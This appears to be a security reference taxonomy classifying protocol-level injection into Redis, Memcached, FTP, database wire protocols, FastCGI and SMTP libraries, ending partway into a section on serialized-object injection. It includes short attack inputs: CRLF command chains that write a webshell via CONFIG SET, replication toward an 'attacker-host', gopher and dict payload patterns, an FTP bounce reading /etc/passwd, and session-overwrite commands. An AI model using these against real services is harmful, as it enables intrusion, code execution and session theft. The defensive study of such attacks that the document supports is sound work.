# Protocol-Level Injection — Mutation/Variation Taxonomy

*Comprehensive classification of command/data injection attacks targeting non-HTTP service protocols (Redis, Memcached, database wire protocols, FastCGI, FTP, etc.) through delimiter injection, message framing corruption, cross-protocol confusion, and client library flaws.*

---

## Scope & Boundary Delineation

This taxonomy covers the **injection mechanism into service-layer protocols** — the structural techniques by which an attacker injects commands, corrupts message boundaries, or manipulates data within non-HTTP network service protocols. It is explicitly scoped to avoid overlap with the following existing the-map taxonomies:

| Existing Taxonomy | What It Covers | What This Document Covers Instead |
|---|---|---|
| `04-server-side/ssrf.md` §3-3 | Gopher protocol as **SSRF delivery mechanism** → Redis/Memcached | The **target protocol's injection surface** — what structurally enables command injection regardless of delivery vector |
| `04-server-side/jdbc-attack.md` §1–§10 | JDBC connection URL parameter injection, driver-level deserialization | Wire **protocol message framing** corruption (DEF CON 32 research); brief cross-reference for driver bugs |
| `04-server-side/email-smuggling-and-parser-abuse.md` §1–§8 | SMTP framing, email parsing differentials | Non-SMTP protocol injection; SMTP client library CRLF briefly covered as an entry vector class |
| `03-http-protocol/http-header.md` §4 | HTTP CRLF injection & response splitting | CRLF injection in **non-HTTP service protocols** (Redis RESP, Memcached text, FTP) |
| `01-injection/command-injection.md` | OS shell command injection | Service protocol command injection (no shell involved) |
| (RCE outcome vectors) | Redis MODULE LOAD, UAF, Lua sandbox escape as **RCE outcomes** | The **injection mechanism** — how protocol commands are injected in the first place |
| `01-injection/ldap-xpath.md` | LDAP **query syntax** injection | Protocol-level framing; LDAP protocol briefly in §1-4 |

**Core differentiator:** Existing taxonomies treat protocol injection either as a *delivery mechanism* (SSRF), a *query syntax* problem (SQL/NoSQL/LDAP), or a *terminal RCE outcome* (Redis MODULE LOAD). This document treats **the protocol-level injection mechanism itself** as the primary subject — the structural properties of service protocols that enable command injection, data manipulation, and information disclosure.

---

## Classification Structure

This taxonomy organizes protocol-level injection along three axes:

**Axis 1 — Injection Mechanism (Primary, §1–§6):** The structural technique by which commands or data are injected into the target protocol. This axis structures the main body of the document.

**Axis 2 — Discrepancy Type (Cross-cutting):** The nature of the parsing/interpretation mismatch that enables each injection. These types recur across multiple mechanism categories:

| Discrepancy Type | Description | Primary Sections |
|---|---|---|
| **Command Boundary Confusion** | Injected delimiters (CRLF, null, space) create new command boundaries within what should be a single data element | §1, §4 |
| **Message Size/Framing Mismatch** | Integer overflow or manipulation of length fields causes the protocol to misinterpret where one message ends and another begins | §2 |
| **Protocol Identity Confusion** | One protocol's request is interpreted as valid commands by a different protocol (cross-protocol) | §3 |
| **Serialization Format Confusion** | Data intended as a passive payload is interpreted as executable objects (pickle, PHP serialize) because the protocol layer doesn't distinguish data from code | §5 |
| **Trust Boundary Violation** | Client libraries or connection handlers pass unsanitized user input directly into protocol message construction | §4, §6 |
| **Compression/Encoding Differential** | Mismatch between declared and actual compressed/encoded payload sizes enables buffer manipulation | §2-2, §5-3 |

**Axis 3 — Attack Scenario (Mapping, §7):** The real-world deployment context — cache poisoning, session hijacking, internal service pivot, data exfiltration, authentication bypass, and RCE chain composition.

### Foundational Concept: Why Service Protocols Are Injectable

Most non-HTTP service protocols share a design property that makes them fundamentally injectable: **they use simple, predictable delimiters (CRLF, null bytes, fixed-length headers) to separate commands, and they assume the transport layer provides message integrity.** Unlike HTTP — which has evolved elaborate framing (chunked encoding, content-length, HTTP/2 frames) and is the subject of extensive security research — protocols like Redis RESP, Memcached text, FTP, and SMTP were designed for trusted network environments where the client is assumed to be cooperative.

When user-controlled data reaches these protocols through any intermediary (SSRF, HTTP library, application parameter, cross-protocol request), the protocol's simple framing becomes the injection surface.

---

## §1. CRLF/Delimiter Command Injection in Text-Based Protocols

Text-based service protocols use line-oriented command framing: each command is a sequence of tokens terminated by `\r\n` (CRLF). When user-controlled data is embedded into a command without delimiter sanitization, the attacker can terminate the current command and inject arbitrary new commands. This is the most fundamental and widely applicable protocol injection mechanism.

### §1-1. Redis RESP Inline Command Injection

Redis supports two command modes: RESP (binary-safe, length-prefixed) and **inline** (space-separated, CRLF-terminated). The inline mode was designed for telnet debugging but creates a broad injection surface because Redis accepts any line of text as a potential command — parsing line-by-line and simply returning errors for invalid commands.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Inline command injection via CRLF** | Injecting `\r\n` into any data field that reaches Redis inline mode splits the input into multiple commands. Example: `SET key "value\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSAVE\r\n"` | User input reaches Redis without CRLF sanitization; inline mode active (default for non-RESP connections) |
| **RESP array command injection** | When constructing RESP protocol messages programmatically, unsanitized input in the bulk string count or length field can corrupt the array structure, causing subsequent data to be parsed as new commands: `*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$N\r\n...\r\n*1\r\n$7\r\nSHUTDOWN` | Application manually constructs RESP messages with user-supplied data; length field mismatch |
| **Gopher-delivered CRLF injection** | The `gopher://` URL scheme sends raw TCP bytes. SSRF vulnerabilities that support Gopher allow crafting complete RESP command sequences: `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a...` (→ cross-ref `ssrf.md` §3-3 for delivery mechanism) | SSRF with Gopher support; Redis reachable from SSRF context |
| **Persistence payload via CONFIG** | After injecting commands, `CONFIG SET dir /path/ && CONFIG SET dbfilename file.ext && SAVE` writes a Redis RDB dump containing attacker-controlled data to an arbitrary filesystem path — weaponized for webshell deployment, cron job injection, or SSH authorized_keys write | Redis running with filesystem write privileges; writable target directory |
| **Replication-based payload delivery** | `SLAVEOF attacker-host 6379` forces the target Redis to replicate from an attacker-controlled master. The malicious master can then push MODULE LOAD commands to load native shared libraries (→ cross-ref RCE taxonomy §8-1 for module loading as RCE outcome) | Redis without ACL restrictions on SLAVEOF/REPLICAOF; network egress to attacker |

### §1-2. Memcached Text Protocol Command Injection

Memcached's text protocol uses CRLF-terminated commands with a simple grammar: `<command> <key> <flags> <exptime> <bytes>\r\n<data block>\r\n`. The critical injection insight is that the **key parameter** is terminated by a space, the **data block** is terminated by `\r\n` after exactly `<bytes>` bytes, and the **command stream** is terminated by `\r\n` — creating three distinct injection surfaces.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Key-based CRLF injection (batch injection)** | Injecting `\r\n` into the key parameter of a `get` or `set` command terminates the current command and injects new ones. Example: `get key1\r\nset injected 0 3600 11\r\nmaliciousval\r\n` | User input used as cache key without CRLF filtering; text protocol (not binary) |
| **Data length manipulation (state breaking)** | The `<bytes>` parameter declares how many bytes of data follow. If the attacker can manipulate this value (e.g., by injecting a shorter `<bytes>` value than the actual data), the excess data is parsed as new commands — the Memcached parser's state machine transitions from "reading data" to "reading command" prematurely | Attacker controls both the data length declaration and the data content |
| **Argument injection via space/null-byte** | Space (0x20) separates command arguments. Null bytes (0x00) may terminate strings in some client implementations but not in Memcached itself. Injecting spaces into key names can shift argument positions, changing the semantics of the command | Client library uses C-style string functions that don't properly escape spaces in keys |
| **Quoted-string CRLF encoding bypass** | Some client libraries (pylibmc for Python) accept RFC2109 quoted-string encoding where `\015\012` represents `\r\n` in octal notation. Cookie values containing these sequences pass through HTTP parsing intact and are decoded by the Memcached client library into literal CRLF bytes before reaching the Memcached server | pylibmc or similar client with quoted-string processing; Memcached used as session backend |
| **CRC32 collision key targeting** | Flask-Session computes session keys using a prefix plus the session ID. By crafting a session ID whose CRC32 hash collides with a target key, the attacker can manipulate which Memcached shard receives the injected command, targeting specific session entries on specific servers | Memcached cluster with CRC32-based key hashing; Flask-Session or similar framework |

### §1-3. FTP Command Injection

FTP uses a CRLF-terminated command protocol on the control channel (port 21). The `PORT` and `PASV` commands establish data channels, creating a secondary exploitation surface where the FTP server can be directed to connect to arbitrary hosts/ports.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Filename-based command injection** | FTP commands like `RETR`, `STOR`, `DELE` accept filenames. Injecting CRLF into the filename parameter terminates the current command and injects new ones: `RETR file.txt\r\nDELE important.dat\r\n` | SSRF or application proxying FTP commands with user-controlled filenames |
| **PORT command bounce attack** | The `PORT` command directs the server to open a data connection to a specified IP:port. By injecting arbitrary PORT commands, an attacker can use the FTP server as a proxy to port-scan internal networks or relay data: `PORT 10,0,0,1,0,80\r\nRETR /etc/passwd` | FTP server that does not validate PORT addresses against the client's IP |
| **PASV response manipulation** | In passive mode, the server returns the IP:port for the data channel. A malicious FTP server (in SSRF context) can return an internal IP in the PASV response, directing the SSRF-initiating application to connect to an arbitrary internal service | SSRF targeting FTP services that report passive mode addresses |
| **URL scheme CRLF injection** | FTP URLs processed by libraries (Java's `java.net.URL`, Python's `urllib`) may allow CRLF injection in the path or credential components, which are then sent as raw FTP commands to the server | Application processing user-supplied FTP URLs without sanitization |

### §1-4. Other Line-Oriented Protocol Injection

The CRLF delimiter injection pattern extends to any line-oriented service protocol. While less commonly exploited than Redis and Memcached, these protocols present the same structural vulnerability.

| Protocol | Injection Surface | Example Impact |
|---|---|---|
| **Zabbix Agent** | The Zabbix agent protocol accepts newline-separated commands. `system.run[command]` executes OS commands if `EnableRemoteCommands=1`. CRLF injection into agent requests enables command injection | RCE via agent protocol (CVE-2024-22116: Zabbix server script execution) |
| **IMAP/POP3** | Line-oriented mail retrieval protocols. CRLF injection into login credentials or folder names can inject protocol commands: `LOGIN user "pass\r\nDELETE 1"` | Email deletion, mailbox manipulation, information disclosure |
| **LDAP (protocol-level)** | Beyond query syntax injection (→ cross-ref `ldap-xpath.md`), LDAP's wire protocol uses BER-encoded messages where improperly constructed requests can trigger parser state confusion in server implementations | Authentication bypass (CVE-2025-54918: NTLM LDAP auth bypass), DoS (CVE-2024-49113: LDAPNightmare), RCE (CVE-2024-49112) |
| **DICT** | The DICT protocol (`dict://host:port/d:word`) sends raw lookup commands over TCP. SSRF vulnerabilities supporting DICT enable single-command injection into any TCP service by crafting the word parameter | Information disclosure, limited command injection (single command per request) |
| **IRC** | Internet Relay Chat uses CRLF-terminated commands. CRLF injection in nick/channel/message parameters enables command injection, channel control, and server manipulation | Channel takeover, message spoofing, operator command injection |

---

## §2. Binary Protocol Message Framing Corruption

Binary protocols (PostgreSQL wire protocol, MongoDB wire protocol, FastCGI) use **length-prefixed messages** instead of delimiter-terminated commands. Injection into these protocols requires corrupting the framing itself — manipulating size fields, exploiting integer overflows, or abusing compression layers to desynchronize the message parser.

### §2-1. Database Wire Protocol Message Size Overflow

Database client-server communication uses binary protocols where each message has a fixed-format header containing a message type byte and a 32-bit length field. When a client library constructs a message with user-controlled data that exceeds the 32-bit length field's capacity, integer overflow causes the library to split a single logical message into multiple physical messages — with the attacker controlling the content of the "extra" messages.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **PostgreSQL pgx/pgproto3 message size overflow** | The Go `pgx` driver calculates protocol message sizes using a 32-bit integer. When a parameter value exceeds ~4GB, the size field overflows and wraps around. The driver sends the first portion as the intended message, and the remaining bytes are interpreted by PostgreSQL as **new, independent protocol messages** — including `Query` or `Parse` messages containing attacker-controlled SQL (CVE-2024-27304, CVSS Critical) | Application passes large user-controlled strings to parameterized queries via pgx; no request size limit enforced |
| **PostgreSQL simple protocol parameter injection** | In simple protocol mode (`PreferQueryMode=SIMPLE`), the pgx driver concatenates parameters directly into the SQL text. A specific pattern (negative number followed by string parameter on the same line) allows injecting SQL that bypasses parameterization (CVE-2024-27289) | pgx v4 in simple protocol mode; specific parameter pattern |
| **PostgreSQL psql UTF-8 escape confusion** | Invalid UTF-8 byte sequences in string escaping routines cause `psql` to misinterpret the escape boundary, allowing SQL injection even through properly escaped parameters. Chained with the BeyondTrust compromise to infiltrate 17+ enterprise customers (CVE-2025-1094, actively exploited) | PostgreSQL string escaping applied to data containing crafted invalid UTF-8 |
| **MongoDB driver message framing** | Similar to the PostgreSQL attack: MongoDB wire protocol uses 32-bit message length fields. Driver implementations that don't validate total message size against the 32-bit limit can be exploited to inject additional protocol messages into the connection stream | MongoDB driver with insufficient size validation; application accepting large inputs |

**Bypass vectors for size-limit defenses:** The primary mitigation (enforcing request size limits) can be circumvented through: (1) WebSocket connections, which often lack request size limits; (2) HTTP compression applied after limit checks; (3) alternative API endpoints without size validation; (4) chunked/streaming request bodies that accumulate beyond the limit.

### §2-2. Protocol Compression Layer Exploitation

Modern database and service protocols support message-level compression (zlib, LZ4, Snappy) to reduce bandwidth. When the compression layer trusts client-declared metadata (uncompressed size, compression algorithm) without validation, attackers can exploit the mismatch between declared and actual sizes.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **MongoDB OP_COMPRESSED heap memory disclosure (MongoBleed)** | MongoDB's OP_COMPRESSED message format includes an `uncompressedSize` field. When an attacker sends a compressed message declaring a much larger uncompressed size than the actual payload, MongoDB allocates an oversized buffer, fills it with the small decompressed payload, and the rest remains as **uninitialized heap memory**. The BSON parser's `validateBSON()` reads beyond the actual decompressed data because the allocation length field says there is more, and when parsing fails, the server includes the leaked heap data in the error response (CVE-2025-14847, CVSS 7.5 v3.1 / 8.7 v4.0; Akamai and Qualys report CISA KEV listing and active exploitation; exposed-instance counts vary by third-party source) | MongoDB with compression enabled (requires client-server compressor negotiation; zlib is advertised by default but only active when both sides agree); unauthenticated access to port 27017; broad internet exposure reported by multiple third-party sources |
| **Decompression bomb in protocol messages** | Crafted compressed payloads with extreme compression ratios (e.g., 1KB compressed → 1GB decompressed) can cause memory exhaustion in protocol parsing, leading to DoS or exploitable heap state | Any protocol supporting message-level compression without decompression size limits |
| **Compression algorithm negotiation downgrade** | During connection handshake, if the client can force a weaker or more exploitable compression algorithm, subsequent protocol interactions may be vulnerable to algorithm-specific attacks | Protocol with negotiable compression; no server-side algorithm restriction |

### §2-3. FastCGI Record Structure Exploitation

The FastCGI protocol uses a binary record format with an 8-byte header containing version, type, request ID, content length, and padding length. Records carry key-value parameters, stdin data, and response streams. Integer overflow in parameter parsing creates injection surfaces.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Parameter size integer overflow** | FastCGI parameters are encoded with variable-length size fields (1 or 4 bytes depending on value). The library's `ReadParams` function computes `nameLen + valueLen + 2` which overflows on 32-bit systems when both lengths are `0x7FFFFFFF`, resulting in a near-zero `malloc` allocation followed by a massive heap write (CVE-2025-23016) | FastCGI library (libfcgi) on 32-bit systems; FastCGI socket exposed via TCP |
| **PHP_VALUE/PHP_ADMIN_VALUE parameter injection** | FastCGI requests to PHP-FPM include parameters like `PHP_VALUE` that set PHP configuration directives. By injecting `auto_prepend_file=php://input` or `allow_url_include=1`, attackers achieve RCE through PHP configuration manipulation | PHP-FPM FastCGI socket accessible (locally or via SSRF); CVE-2024-4577 argument injection variant for PHP-CGI on Windows |
| **SCRIPT_FILENAME path traversal** | The `SCRIPT_FILENAME` parameter determines which PHP file is executed. Path traversal in this parameter allows executing arbitrary PHP files on the filesystem | Direct FastCGI access without web server mediation |
| **Record padding manipulation** | The padding field in FastCGI record headers allows up to 255 bytes of arbitrary padding. Malformed padding can cause parser state confusion in implementations that don't properly skip padding bytes | Non-conformant FastCGI parser implementations |

### §2-4. Protocol Version & Feature Negotiation Attacks

Many service protocols begin with a handshake that negotiates version, capabilities, and security features. Manipulating this negotiation can downgrade security or enable protocol features that expand the attack surface.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Redis AUTH bypass via protocol version** | Redis 6+ introduced ACL and RESP3 protocol. Connections defaulting to RESP2 may have different authentication requirements. Crafting protocol version negotiation can affect which commands are available pre-authentication | Redis with misconfigured ACL for different protocol versions |
| **Memcached text vs. binary protocol switching** | Memcached supports both text and binary protocols on the same port. The binary protocol has different injection characteristics (length-prefixed, not CRLF-delimited). Some defenses only protect against text protocol injection | Memcached accepting both protocols; defense only filtering text protocol patterns |
| **TLS/STARTTLS downgrade** | Service protocols supporting STARTTLS (LDAP, FTP, SMTP, IMAP) can be downgraded to plaintext through MITM stripping of the STARTTLS capability advertisement, exposing all subsequent protocol traffic including credentials | MITM position; service not requiring TLS; client not enforcing TLS |
| **MongoDB wire protocol version confusion** | MongoDB deprecated legacy wire protocols (OP_INSERT, OP_UPDATE, OP_DELETE) in favor of OP_MSG. Server implementations that still support legacy opcodes may have different security characteristics, and crafted requests using deprecated opcodes may bypass newer security checks | MongoDB server with legacy opcode support enabled |

---

## §3. Cross-Protocol Request Forgery & Tolerance Exploitation

Cross-protocol attacks exploit the fact that service protocols designed for trusted environments often **tolerate malformed input** — parsing what they can and discarding what they can't. When an attacker can cause a system to send data to a service port in a different protocol's format (e.g., HTTP request to Redis port), the target service's tolerant parsing may execute embedded commands despite the overall message being invalid.

### §3-1. Protocol Tolerance Exploitation

The key property enabling cross-protocol attacks is **line-by-line processing with error tolerance**: Redis, Memcached, and similar services parse each input line independently and respond with errors for invalid commands while continuing to process subsequent lines.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Redis HTTP request processing** | Redis parses input line-by-line. An HTTP POST request to Redis port 6379 is parsed as: `POST` → error; `/path` → error; `Host: value` → error; body lines → potentially valid Redis commands. Each line that happens to be a valid Redis command (even embedded in HTTP) is executed | Network access to Redis port; no authentication or auth token present in HTTP body |
| **Redis cross-protocol protection bypass** | Since Redis 3.2.7, `POST` and `Host:` are aliased to `QUIT` to defend against HTTP-based attacks. However, this protection only covers HTTP — other protocols (WebSocket upgrade requests, SMTP-like connections) that don't start with POST/Host: are not caught | Redis ≥3.2.7 with non-HTTP cross-protocol vectors; or custom HTTP requests avoiding POST/Host: |
| **Memcached HTTP tolerance** | Memcached's text protocol similarly processes lines independently. HTTP request lines and headers are ignored as invalid commands, but carefully placed valid Memcached commands in the request body (after `\r\n\r\n`) are executed | Network access to Memcached port; text protocol enabled |
| **Selective command extraction** | Attackers craft cross-protocol payloads where only specific lines form valid target protocol commands. The service discards everything else but executes the valid commands. This works because the protocols don't require a valid session establishment — any valid command line is executed immediately | Line-oriented protocol with per-line parsing and error tolerance |

### §3-2. Browser-Initiated Cross-Protocol Attacks

Web browsers can be weaponized to send requests to non-HTTP service ports through HTML forms, XMLHttpRequest (for same-origin), or DNS rebinding. The browser formats the request as HTTP, but the target service's tolerant parser extracts valid protocol commands from the HTTP payload.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **HTML form POST to Redis/Memcached** | An `<form>` with `action="http://localhost:6379"` and method POST sends an HTTP POST request to the Redis port. Redis parses each line; the POST body (after headers) can contain valid RESP inline commands. The body content-type and encoding affect which characters can be delivered | Redis/Memcached bound to localhost or accessible IP; no authentication; browser same-origin policy does not prevent sending the request (only reading the response) |
| **DNS rebinding to internal services** | Attacker's domain resolves to attacker's IP initially (serving the malicious page), then changes DNS to resolve to `127.0.0.1` or an internal IP. The browser's same-origin check passes (same domain), allowing JavaScript to interact with the internal service. Combined with `fetch()` or XHR, this delivers protocol commands as HTTP request bodies | DNS rebinding setup; short TTL DNS; target service on expected port; CVE-2025-66416: MCP SDK vulnerability enables this against MCP servers |
| **WebSocket upgrade to non-HTTP service** | WebSocket handshake starts as an HTTP Upgrade request. If the target service doesn't understand WebSocket but processes the subsequent frames as raw TCP, the attacker can send arbitrary bytes via the WebSocket API — bypassing the browser's CRLF injection protections that apply to HTTP headers | Service port accessible from browser; service doesn't validate WebSocket handshake |
| **fetch() with mode: 'no-cors'** | `fetch('http://localhost:6379', {method: 'POST', body: 'COMMAND...'})` sends a cross-origin POST to Redis. The browser blocks reading the response, but the request (including body) is still sent and processed by Redis | Redis accessible from browser network; no authentication |

### §3-3. Protocol Tunneling via URL Scheme Handlers

URL scheme handlers (Gopher, DICT, TFTP, file) provide protocol-agnostic TCP communication capabilities that can be weaponized through SSRF vulnerabilities to reach internal service protocols. This subsection provides a **mechanism-focused complement** to the delivery-mechanism coverage in `ssrf.md` §3-3.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Gopher raw TCP delivery** | `gopher://host:port/_payload` sends arbitrary bytes after the initial character. URL-encoded CRLF (`%0d%0a`) creates line breaks in the payload. This enables injection of complete, multi-line command sequences into any TCP service | SSRF supporting Gopher scheme; no URL scheme restriction |
| **DICT single-command injection** | `dict://host:port/d:word` sends `CLIENT libcurl\r\nDEFINE ! word\r\nQUIT\r\n` to the target. By manipulating the `word` parameter, a single command can be injected. Limited to one command per request due to the automatic QUIT | SSRF supporting DICT scheme; useful for services where a single command is sufficient (Redis SET, Memcached set) |
| **TFTP read/write as data channel** | `tftp://host/file` reads or writes files via UDP. When chained with SSRF, TFTP can exfiltrate data to attacker-controlled servers or write files on hosts running TFTP servers | SSRF supporting TFTP; target running TFTP daemon |
| **Scheme-specific encoding exploitation** | Different URL schemes apply different encoding rules. Gopher URL-decodes once, while HTTP may double-encode. Exploiting this differential allows bypassing URL validation that checks the decoded URL but sends encoded bytes to the target | SSRF with scheme-dependent encoding behavior |

### §3-4. Client-to-Service Protocol Confusion via SSRF Chains

When SSRF (→ cross-ref `ssrf.md`) delivers attacker-controlled data to an internal service, the protocol confusion occurs at the boundary between the HTTP-speaking application and the non-HTTP internal service. This subsection catalogues the unique **protocol confusion patterns** not already covered in the SSRF taxonomy.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **HTTP-to-RESP protocol confusion** | HTTP libraries that follow redirects can be redirected from `http://attacker.com/302` to `http://127.0.0.1:6379/` . The HTTP request line `GET /\r\nSET... HTTP/1.1\r\n` is parsed by Redis as inline commands, with the path containing injected RESP commands | SSRF following redirects; Redis bound to localhost |
| **HTTP body as protocol payload** | POST-based SSRF sends the HTTP body as raw bytes after the headers. The target service ignores the headers (errors) and processes the body content as protocol commands. This works because CRLF sequences in the body are preserved by HTTP | POST-based SSRF to internal service; body content under attacker control |
| **Multi-hop protocol pivoting** | Redis `SLAVEOF` → attacker's master → `MODULE LOAD` chain: SSRF injects SLAVEOF command into Redis, Redis initiates outbound replication to attacker, attacker's fake master delivers malicious module | Redis reachable via SSRF; network egress from Redis to attacker; Redis without ACL on replication commands |
| **FTP passive mode SSRF pivot** | SSRF to a malicious FTP server → server returns PASV response pointing to an internal service → client connects to internal service to receive "file data" — effectively redirecting the SSRF to a different internal host/port | SSRF to attacker-controlled FTP; client follows PASV redirect without validating target |

---

## §4. Client Library Protocol Handling Vulnerabilities

Client libraries (HTTP clients, cache clients, database drivers, SMTP codecs) construct protocol messages from application-provided data. When these libraries fail to sanitize delimiters or validate message boundaries, they become the injection vector — even when the application itself appears to handle input correctly.

### §4-1. HTTP Client CRLF Passthrough to Backend Protocols

HTTP client libraries that allow CRLF characters in URL components, headers, or request bodies can be weaponized to inject commands into backend services. This is particularly dangerous when the HTTP client is used in an SSRF context — the injected CRLF breaks the HTTP protocol framing and delivers raw protocol commands to the backend.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Python urllib/urllib2 CRLF injection** | `urllib.request.urlopen("http://host/path%0d%0aINJECTED-COMMAND")` — Python's HTTP libraries (pre-fix versions) passed URL-decoded CRLF characters directly into the HTTP request line, enabling injection of arbitrary HTTP headers or, when targeting non-HTTP services, raw protocol commands (CVE-2019-9740, CVE-2019-9947) | Python ≤3.7.3 / ≤2.7.16; URL with encoded CRLF in path or query |
| **Node.js http module CRLF** | Node.js `http.request()` historically allowed CRLF in various request components. The `unicode-characters-in-path` fix (CVE-2018-7159 and related) addressed Latin-1 range characters (Node.js 10.23.1/12.20.1/14.15.4/15.5.1) but specific bypass patterns persisted in certain versions | Affected Node.js versions; user-controlled URL path |
| **Go net/http header injection** | Go's `net/http` client allowed CRLF injection in header values and URL parameters in certain versions, enabling injection of additional HTTP requests or protocol commands into the raw TCP stream | Affected Go versions; user-controlled header values or URL parameters |
| **Netty HttpRequestEncoder CRLF** | Netty's `DefaultHttpRequest` and `DefaultFullHttpRequest` constructors accepted URIs containing CRLF sequences without sanitization. When encoded by `HttpRequestEncoder`, the injected CRLF caused request smuggling or protocol command injection (CVE-2025-67735) | Netty < 4.1.129.Final / < 4.2.8.Final; user-controlled URI |
| **Refit library header injection** | The C# Refit library's `[Header]`, `[HeaderCollection]`, and `[Authorize]` attributes used `HttpHeaders.TryAddWithoutValidation`, which doesn't check for CRLF characters, enabling header injection (CVE-2024-51501) | Refit library; user-controlled header values |

### §4-2. Cache Client Library Delimiter Injection

Cache client libraries (pylibmc, php-memcached, node-redis) construct Memcached/Redis commands from application-provided keys and values. Insufficient delimiter escaping in these libraries creates direct protocol injection surfaces.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **pylibmc quoted-string CRLF** | Python's pylibmc Memcached client accepts RFC2109 quoted-string encoding in key parameters. When session IDs from HTTP cookies flow through pylibmc, the octal sequences `\015\012` are decoded into literal CRLF bytes, creating a Memcached command injection surface that operates entirely through the client library | pylibmc as Memcached client; Flask-Session or similar framework using cookie-derived session keys |
| **PHP Memcached extension key injection** | PHP's `Memcached` extension performs minimal sanitization on key parameters. Null bytes and CRLF in keys can corrupt the text protocol command, with behavior depending on the specific extension version and configuration | PHP Memcached extension; user-controlled cache keys |
| **Node.js redis client injection** | Older versions of the `redis` npm package constructed inline commands by string concatenation. User-controlled key or value data containing CRLF sequences could inject additional Redis commands | node-redis prior to RESP-safe command construction; user-controlled keys/values |
| **Jedis/Lettuce pipeline injection** | Java Redis clients using pipelining (sending multiple commands without waiting for responses) may have race-condition windows where injected commands from one pipeline context appear in another, especially under connection pool reuse | Redis client pipelining with shared connections; high-concurrency applications |

### §4-3. SMTP Client Codec CRLF Injection

SMTP client libraries and codecs construct protocol commands from application-provided email addresses, subjects, and headers. CRLF injection in these components enables arbitrary SMTP command injection, with the injected commands appearing to come from the trusted server IP — passing SPF and DKIM checks.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Netty SMTP codec command injection** | Netty's SMTP codec (`netty-codec-smtp`) does not validate for `\r` and `\n` characters in user-supplied command parameters (recipient addresses, message data). Injected CRLF sequences create new SMTP commands that the receiving MTA executes as separate, legitimate commands from the sending server (CVE-2025-59419) | Netty SMTP codec; user-controlled recipient/sender addresses |
| **Jakarta Mail SMTP injection** | The `jakarta.mail` component allows SMTP message injection by exploiting improper handling of `\r` and `\n` characters encoded in UTF-8. An unauthenticated attacker can forge arbitrary SMTP messages (CVE-2025-7962) | Jakarta Mail 2.0.2; user-controlled email parameters |
| **Python smtplib RCPT TO injection** | Python's `smtplib` historically allowed CRLF in `RCPT TO` addresses, enabling injection of arbitrary SMTP commands after the recipient command | Python smtplib; user-controlled recipient addresses (→ cross-ref `email-smuggling.md` §1-3 for broader SMTP injection context) |

### §4-4. Database Driver Protocol-Level Parsing Flaws

Database drivers translate application queries into wire protocol messages. Flaws in this translation — particularly in how drivers handle encoding boundaries, parameter serialization, and message construction — create protocol-level injection surfaces distinct from SQL syntax injection (→ cross-ref `jdbc-attack.md` for connection URL parameter injection).

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **PostgreSQL JDBC preferQueryMode=SIMPLE** | The PostgreSQL JDBC driver in simple query mode concatenates parameters directly into SQL strings sent via the wire protocol's simple query message, bypassing the prepared statement path that provides parameterization (CVE-2024-1597, CVSS 10.0) | PostgreSQL JDBC with `preferQueryMode=SIMPLE`; applications using this mode for compatibility |
| **pgx wire protocol message splitting** | As detailed in §2-1: the Go pgx driver's 32-bit size calculation causes message framing corruption, enabling injection of protocol messages (CVE-2024-27304) | Large user-controlled parameter values; pgx driver |
| **MySQL Connector autoDeserialize** | MySQL Connector/J with `autoDeserialize=true` deserializes BLOB results from `SHOW SESSION STATUS` into Java objects, enabling gadget chain execution (→ cross-ref `jdbc-attack.md` §1 for full chain analysis) | Attacker-controlled JDBC URL or connection reaching malicious MySQL server |

---

## §5. Protocol-Level Data Manipulation & Exfiltration

Beyond command injection, protocol-level attacks can manipulate the data stored by or transmitted through services — poisoning caches, corrupting sessions, injecting serialized objects, and leaking memory contents through protocol-level bugs.

### §5-1. Cache Entry Poisoning & Session Store Manipulation

When a protocol injection primitive (§1, §3, §4) allows writing arbitrary key-value pairs, the most immediate impact is manipulation of the application's data layer — session stores, authentication caches, rate limit counters, and feature flags.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Session ID value overwrite** | Memcached/Redis command injection to `SET session:<target_sid> <attacker_session_data>` replaces a victim's session with attacker-controlled session data, achieving session hijacking without needing the victim's authentication credentials | Protocol injection primitive; knowledge of session key format (typically `session:UUID`) |
| **Rate limit counter reset** | `SET ratelimit:<target_ip> 0` or `DEL ratelimit:<target_key>` resets rate limiting counters, enabling brute-force attacks that were otherwise throttled | Protocol injection; knowledge of rate limit key format |
| **Feature flag manipulation** | `SET feature:admin_panel true` or similar key-value manipulation can toggle application feature flags stored in Redis/Memcached, enabling access to administrative features | Protocol injection; knowledge of feature flag key schema |
| **Cache poisoning for response manipulation** | Injecting crafted values into application cache entries causes the application to serve attacker-controlled content to other users on cache hit — effectively a server-side cache poisoning attack that operates at the data store level rather than the HTTP cache level | Protocol injection; knowledge of cache key schema; cached content served to other users |
| **XDEL/XADD stream manipulation** | Redis Streams (`XADD`, `XDEL`, `XRANGE`) used for event queues can be manipulated via command injection to inject fake events, delete legitimate events, or read events from other consumers | Protocol injection; Redis Streams used for application event processing |

### §5-2. Serialized Object Injection via Protocol Channel

Many frameworks store serialized objects (Python pickle, PHP serialize, Java serialized objects, Ruby Marshal) in Memcached or Redis as session data, cached computation results, or job queue entries. Protocol injection that writes to these keys enables **deserialization attacks** through the protocol channel.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Pickle injection via Memcached** | Flask-Session with Memcached backend stores sessions as Python pickle objects. Memcached command injection (§1-2) writes a malicious pickle payload to the victim's session key. When the application loads the session, `pickle.loads()` executes the attacker's code via `__reduce__` (CVE-2021-33026 pattern) | Flask-Session + Memcached + pylibmc; CRLF injection in session ID → Memcached command injection → pickle RCE |
